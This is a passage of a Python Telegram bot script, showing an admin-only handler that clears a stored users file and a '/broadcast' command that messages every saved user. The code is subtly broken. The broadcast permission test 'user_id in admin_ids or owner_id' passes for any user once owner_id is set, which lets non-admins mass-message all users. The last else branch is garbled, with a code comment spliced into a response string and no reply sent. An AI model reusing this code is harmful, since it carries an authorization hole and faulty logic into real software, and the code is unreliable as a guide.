                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"


# Start the bot
bot.polling()

